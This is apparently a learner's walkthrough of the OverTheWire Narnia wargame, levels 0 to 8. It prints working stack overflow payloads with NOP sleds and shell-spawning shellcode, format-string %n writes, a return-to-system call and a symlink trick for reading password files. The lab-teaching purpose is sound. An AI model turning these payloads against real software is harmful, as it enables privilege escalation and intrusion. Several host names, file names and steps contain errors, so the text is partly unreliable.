First connect to Narnia server via ssh.The password for Narnia0 is "narnia0" which is given in the website itself.
So, the password in file using nano editor.
```bash
nano narnia0
```
And then connect it.
```bash
sshpass -p `cat narnia0` ssh narnia0@narnia.labs.overthewire.org -p 2226
```
Once connected to the server check where the passwords are stored.
```bash
find / -name 'narnia*' -print 2>/dev/null
```
Looks like the passwords are stored in `/etc/narnia_pass directories`
 Now check the files using ls cmds. And then change the directory into "narnia".
```bash
cd /narnia
```
List all files now.
```bash
ls -la
```
In this directory there is 8  narnia level files.
<img src="./img/Screenshot 2024-09-13 182654.png"></img>
let see the level 0 first.
```bash
cat nanrnia0.c
```
<img src="./img/Screenshot 2024-09-13 182719.png"></img>
By seeing this C program it seems like it reads the user input into a 20-character buffer (`buf`) but allows up to 24 characters to be entered, potentially overwriting the adjacent `val` variable. The goal is to change the value of `val` from `0x41414141` to `0xdeadbeef`. If successful, the program grants elevated privileges and spawns a shell (`/bin/sh`). Otherwise, it exits with an error.
To execute the C file.
```bash
./narni0
```
<img src="./img/Screenshot 2024-09-13 184622.png"></img>
We executed the program and entered a bunch of "AAAAAAAAAAAAAAAAAAAA". However, the value of `val` stayed as `0x41414141`, where `41` is the ASCII value for `A`. This shows that the buffer overflow didn't fully overwrite `val`. The buffer is stored in a stack structure, and since we didn't give enough input to reach the location of `val`, it remained unchanged except for a minor adjustment. We need to craft the input carefully to overwrite `val` completely.
Let use GDB Debugger for analyzing c code in instruction level
<img src="./img/Screenshot 2024-09-13 185118.png"></img>
```bash
gdb ./nanrnia0
disassemble main
```
Lets add the break point in user input area i.e: scanf
```bash
break *main+54
run
```
<img src="./img/Screenshot 2024-09-13 185549.png"></img>
After adding the breakpoint run the program to check it.
Give sample input. And see the how the input is stored in the memory.
```bash
x/20wx $esp
```
This cmd shows the 20 words of data in Hex from extended  stack pointer.
Add ABCD in last four bite to see the format.It the ABCD is written on reverse order which follows little Endian format.
<img src="./img/Screenshot 2024-09-13 191355.png"></img>
We can not give Hex values as input it deducts as a character only. So we have to preprocess it .since it contain 16 byte.And the scanf can have 24 byte we use 24 byte  to overflow the stack to open a shell.
Exit from gdb editor.
```bash
printf "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"|./narnia0
```
<img src="./img/Screenshot 2024-09-13 192839.png"></img>
Since the value is correct but the shell does not open . To keep shell open we can use cat cmd .
```bash
(printf "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde";cat)|./narnia0
```
<img src="./img/Screenshot 2024-09-13 193235.png"></img>
We got the shell
```bash
cat /etc/narnia_pass/narnia1
```
We got the level 1 password store it file and move to next level.
```bash
sshpass -p `cat narnia1` ssh narnia1@narnia.labs.overthewire.org -p 2226
```
Follow the same step as we did in level 0
And cat file narnia1.c to see the program.
```bash
cat narnia1.c
```
<img src="./img/Screenshot 2024-09-13 194000.png"></img>
This program checks if an environment variable named `EGG` is set. If it is, it attempts to execute the function whose address is specified by `EGG`. If `EGG` is not set, the program prints an error message and exits.
If we execute the program.
```bash
./narnia1
```
<img src="./img/Screenshot 2024-09-13 200009.png"></img>
It throws the error message because the EGG value is empty only.
Try assigning a value to EGG
```bash
export EGG=AAAA
echo $EGG
```
Open the gdb editor
```bash
gdb ./narnia1
disassemble main
```
Break the program where the function calls.
```bash
break *main+75
run
x/25x $esp
```
<img src="./img/Screenshot 2024-09-13 202430.png"></img>
Lets examine 25 words of memory at eax register.
We will see 0x41414141 because we gave AAAA for EGG.
https://shell-storm.org/shellcode/files/shellcode-607.html
Here is the adjust command some changes are made.

```bash
export EGG=`perl -e 'print "\xeb\x11\x5e\x31\xc9\xb1\x21\x80".
                   "\x6c\x0e\xff\x01\x80\xe9\x01\x75".
                   "\xf6\xeb\x05\xe8\xea\xff\xff\xff".
                   "\x6b\x0c\x59\x9a\x53\x67\x69\x2e".
                   "\x71\x8a\xe2\x53\x6b\x69\x69\x30".
                   "\x63\x62\x74\x69\x30\x63\x6a\x6f".
                   "\x8a\xe4\x53\x52\x54\x8a\xe2\xce".
                   "\x81"'`

```
By adding . at the end of each line because it act concatenation in perl and execute in single string. And since we are using bash so added some backtics and assigned the code to the EGG using export.
Now run the code.
```bash
./narnia1
```
Cat the password from the shell we got.
```bash
cat /etc/narnia_pass/narnia2
```
Move to next level 2.
```bash
sshpass -p `cat narnia2` ssh narnia2@narnia.overthewire.labs.org -p 2226
```
Follow the same steps and open the file narnia2.c

```bash
cat narnia2.c
```
This program takes a command-line argument, copies it into a buffer, and prints it out. If no argument is provided, it shows a usage message and exits. It uses `strcpy` to copy the input, which can be risky because it doesn't check if the input is too long for the buffer (128 characters), potentially causing a buffer overflow.
Lets try to pass the arguments.To pass the arguments i use python3.
```bash
./narnia2 $(python3 -c 'print (128*"A")')
```
It's working lets try how many character it can handle . So,i tried with 140 characters. And it got segmentation fault lets try to narrow it.
```bash
./narnia2 $(python3 -c 'print (131*"A")')
```
131 is the max value it can handle.Lets see in GDB editor.
```bash
gdb ./narnia2
disassemble main
```
Add the break points in leave part
```bash
break *main+81
```
Now run the program.
```bash
run $(python3 -c 'print (131*"A")')
```
If we give 132 in place of 131 it says segmentation fault.
But try to increase the number  we got a different error.
```bash
run $(python3 -c 'print (136*"A")')
```
So add other characters
```bash
run $(python3 -c 'print (132*"A"+"BBBB")')
```
<img src="./img/Screenshot 2024-09-15 194735.png"></img>
lets see the memory address and continue to see the return address.
```bash
x/-50x $esp
continue
```
It works. If we make this return address that direct to a shell code we will probably get a shell.
Found a shellcode code which has of `-p` `bash -p` -p Turned on whenever the real and effective user ids do not match. Disables processing of the $ENV file and importing of shell functions. Turning this option off causes the effective uid and gid to be set to the real uid and gid.
https://shell-storm.org/shellcode/files/shellcode-607.html
Exploit structure:
NOP CODE + SHELLCODE + POINTER
NOP Size = 132 - size of(SHELLCODE) 
Pointer Size = 4 and initial value was dummy
 The shell code
```bash
\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81
```
Exploit Structure
'\x90' * (132-57) + Shellcode + Dummy Pointer with size of 4 (\x98\xd2\xff\xff)
Here the 'x90' is a NOP character means it is Non-operational character which just move the operation to next value.

```bash
 run $(python3 -c 'print(132*"A"+"BBBB")')
x/-50wx $esp

```

```bash
r `echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x98\xd2\xff\xff"`
```
<img src="./img/Screenshot 2024-09-15 194808.png"></img>
```bash
 x/250x $esp
```
<img src="./img/Screenshot 2024-09-15 194902.png"></img>
For entering into narnia 2
```bash
/narnia$ ./narnia2 `echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x94\xd5\xff\xff"`
```
<img src="./img/Screenshot 2024-09-15 194927.png"></img>
<img src="./img/Screenshot 2024-09-15 194937.png"></img>
for entering narnia3
```bash
./narnia2 `echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80\x94\xd5\xff\xff"`
```
We got the shell
```bash
cat /etc/narnia_pass/narnia3
```
Move to next level 3.
```bash
sshpass -p `cat narnia3` ssh narnia3@narnia.overthewire.labs.org -p 2226
```
Once connected to the server, execute the Narnia3 program
```bash
cd /narnia
cat narnia3.c
```
<img src="./img/Screenshot 2024-09-15 202031.png"></img>
```bash
./narnia3
```
<img src="./img/Screenshot 2024-09-15 202045.png"></img>
Change the directory to `/tmp`, where we will create a temporary directory:
```bash
cd /tmp
```

Now, create a nested directory structure:
```bash
mkdir -p /tmp/BBBBBBBBBBBBBBBBBBBBBBBBBBB/tmp/
```

Next, create a symbolic link to the password file for Narnia4 in the newly created directory:
```bash
ln -s /etc/narnia_pass/narnia4 /tmp/BBBBBBBBBBBBBBBBBBBBBBBBBBB/tmp/wow
```

To check if the symbolic link was created successfully, list the contents of the directory:
```bash
ls /tmp/BBBBBBBBBBBBBBBBBBBBBBBBBBB/tmp/
```

You can also use the following command for more detailed information:
```bash

ls /tmp/BBBBBBBBBBBBBBBBBBBBBBBBBBB/tmp/ -la
```

Now, create a file named `wow` in the temporary directory:
```bash
touch /tmp/wow
```

Change the permissions of the `wow` file to make it writable:
```bash
chmod 777 /tmp/wow
```

Execute the Narnia3 program with the symbolic link as an argument:
```bash
/narnia/narnia3 /tmp/BBBBBBBBBBBBBBBBBBBBBBBBBBB/tmp/wow
```
<img src="./img/Screenshot 2024-09-15 202106.png"></img>
Finally, read the contents of the `wow` file to retrieve the password for the next level:
```bash
cat /tmp/wow

```
we got the password
Move to level 4
```bash
sshpass -p `cat narnia4` ssh narnia4@narnia.overthewire.labs.org -p 2226
```
```bash
cd /narnia
cat narnia4.c
```
<img src="./img/Screenshot 2024-10-13 110818.png"></img>
Let's analyze and exploit the vulnerability using GDB:
```bash
gdb -q ./narnia4 r $(python3 -c "print('A'*256 + 'BBBB')")
```
Run the program again with a larger input to trigger a segmentation fault and see where the overflow occurs:
```bash
r $(python3 -c "print('A'*264 + 'BBBB')")
```

You'll see a segmentation fault, and the address `0x42424242` (which represents `BBBB`) is where the buffer overflow occurs. This tells us we can overwrite the return address.

Now, examine the stack to locate the exact memory address where you can inject your shellcode:
```bash
x/600wx $esp
```

We'll build the exploit with the following elements: NOP sled, shellcode, and return address.

Here is the shellcode we'll use (57 bytes by Jonathan Salwan):
```bash
\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81
```

Build the payload with 264 bytes of NOP (`\x90`), the shellcode, and a dummy return address.
```bash
`echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80\xf0\xd4\xff\xff"`
```

<img src="./img/Screenshot 2024-10-13 103408.png"></img>
<img src="./img/Screenshot 2024-10-13 103352.png"></img>
<img src="./img/Screenshot 2024-10-13 103352.png"></img>
<img src="./img/Screenshot 2024-10-13 103300.png"></img>

<img src="./img/Screenshot 2024-10-13 103214.png"></img>
<img src="./img/Screenshot 2024-10-13 103238.png"></img>
After running the exploit, we should get a shell. Once you have the shell, retrieve the password for the next level:
```bash
cat /etc/narnia_pass/narnia5
```
Move to next level 5
```bash
sshpass -p `cat narnia5` ssh narnia5@narnia.overthewire.labs.org -p 2226
```

```bash 
cd /narnia
cat narnia5.c
```
<img src="./img/Screenshot 2024-10-13 110830.png"></img>
After connecting, change to the Narnia directory and check the contents of `narnia5.c`:
```bash
cd /narnia cat narnia5.c
```

Next, test the buffer overflow by passing a sequence of bytes:
```bash
./narnia5 $(echo -e "\x41\x41\x41\x41")
```
Then, attempt to exploit the buffer overflow with the following commands:
you can attempt to exploit the buffer overflow with the following commands:
```bash
./narnia5 $(echo -e "\xb0\xd3\xff\xff")%n
```
This runs `narnia5` with the payload `\xb0\xd3\xff\xff` followed by `%n`, which writes the number of bytes output so far to a specified memory address.
```bash
./narnia5 $(echo -e "\xb0\xd3\xff\xff")%20x
```
This command also uses the same payload but adds `%20x`, which reads and displays a value from memory in hexadecimal format.
```bash
./narnia5 $(echo -e "\xb0\xd3\xff\xff")%20x%1$n
```
Here, `%1$n` is added. It combines reading a memory value with writing the byte count to a specified address, potentially overwriting a critical location.
```bash
./narnia5 $(echo -e "\xb0\xd3\xff\xff")%20x%1\$n
```
This command uses `%1\$n` instead of `%1$n`, allowing more precise control over memory manipulation.
```bash
./narnia5 $(echo -e "\xb0\xd3\xff\xff")%496x%1\$n
```
In this last command, `%496x` reads 496 bytes from memory, adjusting how far to read before using `%n` to write the byte count.
<img src="./img/Screenshot 2024-10-13 111621.png"></img>
we got the shell.
```bash
cat /etc/narnia_pass/narnia6
```
Move to next level 6
```bash
sshpass -p `cat narnia6` ssh narnia6@narnia.overthewire.labs.org -p 2226
```

```bash
cd /narnia
```

Change the directory to `/narnia` where the relevant files for the Narnia challenge are located.
```bash
cat narnia6.c
```
<img src="./img/Screenshot 2024-10-13 112255.png"></img>
View the source code of the `narnia6` executable to understand its logic and identify potential vulnerabilities.
```bash
gdb ./narnia6
```
Start the GNU Debugger (GDB) with the `narnia6` binary to analyze its behavior and locate vulnerabilities.
```bash
disassemble main
```
Disassemble the `main` function of the `narnia6` binary to see the low-level assembly code, which helps identify vulnerable spots.
```bash
break *main+316
```
Set a breakpoint at the instruction located 316 bytes into the `main` function, allowing you to pause execution there for analysis.
```bash
run "AAAAAAAA""BBBBBBBB"
```
<img src="./img/Screenshot 2024-10-13 114518.png"></img>
Run the program with the input `AAAAAAAA` followed by `BBBBBBBB`, which helps to test how the program handles input and observe its behavior at the breakpoint.
```bash
info registers
```
Display the current values of CPU registers, which helps understand the program's state at the breakpoint.
```bash 
x/10wx $esp
```
Examine the stack at the address stored in the stack pointer register (`$esp`). This shows the content of the stack, helping identify where data has been written or overwritten.
```bash
run "AAAAAAAACCCC" "BBBBBBBB"
```
<img src="./img/Screenshot 2024-10-13 114618.png"></img>
Execute the program again with modified input, `AAAAAAAACCCC` followed by `BBBBBBBB`, to test for further buffer overflow effects.
```bash
info registers
```
Check the register values again after the new run to see how they have changed with the different input.
```bash
p system
```
<img src="./img/Screenshot 2024-10-13 114618.png"></img>
Print the address of the `system` function in memory, which is crucial for executing shell commands.
```bash
run `echo -e "AAAAAAAA\x30\xd4\xdc\xf7" "BBBBBBBB"
```
Run the program with a crafted input that includes a specific memory address (`\x30\xd4\xdc\xf7`) along with `BBBBBBBB`. This aims to exploit the buffer overflow to control the program's execution flow.
```bash
run `echo -e "AAAAAAAA\x30\xd4\xdc\xf7" "BBBBBBBBC"
```
<img src="./img/Screenshot 2024-10-13 114752.png"></img>
Execute the program with similar crafted input but a different second argument (`"BBBBBBBBC"`), testing different exploit variations.
```bash
run `echo -e "AAAAAAAA\x30\xd4\xdc\xf7" "BBBBBBBBls"
```
<img src="./img/Screenshot 2024-10-13 114830.png"></img>
Run with an additional command (`ls`) appended to the second argument, further testing the ability to execute commands through the buffer overflow.
```bash
run `echo -e "AAAAAAAA\x30\xd4\xdc\xf7" "BBBBBBBB/bin/sh"
```
Execute with `/bin/sh` as the argument, attempting to spawn a shell via the buffer overflow exploit.

we got a shell in narnia6
This indicates that the exploit was successful, and you have gained a shell access to the `narnia6` environment.
execute the cmd outside the gdb editor

Exit GDB and run the following command in the terminal:
```bash
./narnia6 `echo -e "AAAAAAAA\x30\xd4\xdc\xf7" "BBBBBBBB/bin/sh"
```
we got a shell
```bash
cat /etc/narnia_pass/nanria7
```
Move to next level 7

```bash
sshpass -p `cat narnia7` ssh narnia7@narnia.overthewire.labs.org -p 2226
```
Connect to the Narnia server using SSH. The password for `narnia7` is retrieved from the file containing the password.
```bash
cd /narnia
```

Change the directory to `/narnia`, where the relevant challenge files are located.
```bash
cat narnia7.c
```
View the source code of the `narnia7` executable to understand its logic and identify any vulnerabilities.
```bash
gdb ./narnia7
```
Start the GNU Debugger (GDB) with the `narnia7` binary to analyze its behavior and locate vulnerabilities.
```bash
disassemble vuln
```
Disassemble the `vuln` function to see its assembly code, helping identify where the buffer overflow may occur.
```bash
break *vuln+151
```
Set a breakpoint at the instruction located 151 bytes into the `vuln` function, allowing you to pause execution there for analysis.<img src="./img/Screenshot 2024-10-13 144915.png"></img>
```bash
run "AAAA"
```
Run the program with the input `AAAA`, testing how the program handles input and allowing you to observe its behavior at the breakpoint.
<img src="./img/Screenshot 2024-10-13 122328.png"></img>
```bash
x/20wx $esp
```
Examine the stack at the address stored in the stack pointer register (`$esp`). This shows the contents of the stack, helping identify where data has been written or overwritten.
```bash
run $(echo -e "\x1c\xd3\xff\xff")%x%n
```
<img src="./img/Screenshot 2024-10-13 122411.png"></img>
Execute the program with crafted input, attempting to exploit the buffer overflow. The `%x%n` format specifier is used to print data from the stack.
```bash
x/20wx $esp
```
Check the stack contents again to see how it has changed after the last run.
```bash
run $(echo -e "\x2c\xd3\xff\xff")%x%n
```
Run the program with a different crafted input, further testing for buffer overflow effects and the ability to print stack data.
<img src="./img/Screenshot 2024-10-13 122609.png"></img>
```bash
x/20wx $esp
```

Inspect the stack contents once more to analyze the changes after the new input.
```bash
convert hex value to decimal value
```
<img src="./img/Screenshot 2024-10-13 122632.png"></img>
You may need to convert a specific hexadecimal value to its decimal equivalent using an online converter for later use.
```bash
run $(echo -e "\x2c\xd3\xff\xff")%134517519x%n
```
Execute the program with a crafted input, including a specific decimal value as part of the buffer overflow exploit, aiming to manipulate program execution.
```bash
x/wx 0x08049313
```
Examine the contents of the memory address `0x08049313`, which may hold critical data for the exploit.
```bash
run $(echo -e "\xf8\xd2\xff\xff")%134517519x%n
```
<img src="./img/Screenshot 2024-10-13 123002.png"></img>
Attempt to run the program with a different crafted input to exploit the buffer overflow and control program execution flow.
<img src="./img/Screenshot 2024-10-13 122829.png"></img>
<img src="./img/Screenshot 2024-10-13 123134.png"></img>
we got a shell in narnia7
Indicates that the exploit was successful, and you have gained shell access to the `narnia7` environment.
Execute the command outside the gdb editor
```bash
exit
```
Exit GDB and run the following command in the terminal:
```bash
./narnia7 $(echo -e "\xf8\xd2\xff\xff")%134517519x%n
```
<img src="./img/Screenshot 2024-10-13 123235.png"></img>
This runs the `narnia7` program with the crafted input outside GDB, executing the exploit to obtain a shell.
```bash
goodfunction() = 0x80492ea hackedfunction() = 0x804930f
```
Displays the memory addresses of the `goodfunction` and `hackedfunction`, indicating potential targets for the exploit.
```bash
before : ptrf() = 0x80492ea (0xffffd318)
```
Shows the pointer to the current function, indicating where the program is currently executing.
```bash
I guess you want to come to the hackedfunction... Welcome to the goodfunction, but I said the Hackedfunction..
```
Indicates that the exploit has successfully redirected the program's flow to the intended `hackedfunction`.
```bash
./narnia7 $(echo -e "\x18\xd3\xff\xff")%134517519x%n
```
Run the program again with a slightly different crafted input, attempting to further manipulate execution flow and explore the results.
we got the shell
```bash
cat /etc/narnia_pass/narnia8
```
Move to next level 8:
```bash
sshpass -p `cat narnia8` ssh narnia8@narnia.overthewire.labs.org -p 2226
```

navigate to the `/narnia` directory and examine the source code for Narnia8:
```bash
cd /narnia
cat narnia8.c
```
<img src="./img/Screenshot 2024-10-13 161902.png"></img>
Next, launch GDB to start analyzing the binary:
```bash
gdb -q ./narnia8
```
Disassemble the function `func` to view its instructions:
```bash
disassemble func
```
Set a breakpoint at `func+110`:
```bash
break *func+110
```
Run the program with input to start testing:
```bash
run  AAAA
```
Check the values on the stack:
```bash
x/20wx $esp
```
<img src="./img/Screenshot 2024-10-13 145500.png"></img>
View the register information:
```bash
info register
```
<img src="./img/Screenshot 2024-10-13 145412.png"></img>
Inspect the memory address `0x08049201`:
```bash
x/wx 0x08049201
```
Disassemble the `main` function to further analyze the binary:
```bash
disassemble main
```
View the memory at `0xffffd5c8`:
```bash
x/wx 0xffffd5c8
```
Now examine more of the stack:
```bash
x/200wx $esp
```
Run the program again with a different input:
```bash
run AAAAA
```
Examine a smaller portion of the stack:
```bash
x/10wx $esp
```
Check the binary output using the `xxd` command:
```bash
./narnia8 $(echo -e "AAAAAAAAAAAAAAAAAAAA") | xxd
```

ry exploiting the buffer overflow with specific addresses:
```bash
./narnia8 $(echo -e "AAAAAAAAAAAAAAAAAAAA\x49\xd5\xff\xffAAAA\x66\xd5\xff\xff")
```
<img src="./img/Screenshot 2024-10-13 145544.png"></img>
Try another address combination:
```bash
./narnia8 $(echo -e "AAAAAAAAAAAAAAAAAAAA\x49\xd5\xff\xffAAAA\x90\xd5\xff\xff")
```
You should get a shell after executing the correct exploit. Once you have access to the shell, retrieve the password for the next level:
```bash
cat /etc/narnia_pass/narnia8
```
Explanation:

The shellcode needs to be placed carefully in memory, with specific adjustments based on the offset and address calculations. By understanding the memory locations (like `0xffffd555`), the buffer is manipulated using the logic of subtracting values (e.g., `0x55 - 12 = 0x49`), ensuring we control the return address properly. The shellcode itself is a series of `NOP` instructions (`\x90`) followed by executable code that grants shell access.

Export the shellcode to an environment variable:
```bash
export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81'
```
<img src="./img/Screenshot 2024-10-13 145210.png"></img>